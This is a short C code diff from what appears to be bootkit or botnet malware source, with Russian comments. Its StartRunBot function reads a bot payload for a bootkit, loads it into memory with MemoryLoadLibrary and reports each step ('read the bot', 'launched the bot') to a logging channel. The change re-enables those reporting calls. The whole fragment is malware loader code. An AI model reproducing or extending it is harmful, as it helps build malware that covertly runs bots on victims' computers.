@@ -31,18 +31,18 @@ DWORD WINAPI StartRunBot(LPVOID Data)
 	DisableShowFatalErrorDialog();
 
 	// Инициализируем систему отправки статистической информации
-//	DebugReportInit();
+	DebugReportInit();
 
-//	RunThread( SendLog, "701_pl" ); //запуск процесса
+	RunThread( SendLog, "701_pl" ); //запуск процесса
 
 	DWORD c_data;
 	BYTE* data = ReadBotForBootkit(c_data);
 	if( data )
 	{
-//		RunThread( SendLog, "702_pl" ); //считали бота
+		RunThread( SendLog, "702_pl" ); //считали бота
 		MemoryLoadLibrary(data);
 		MemFree(data);
-//		DebugReportStepByName("703_pl"); //запустили бот
+		DebugReportStepByName("703_pl"); //запустили бот
 	}
 	return 0;
 }
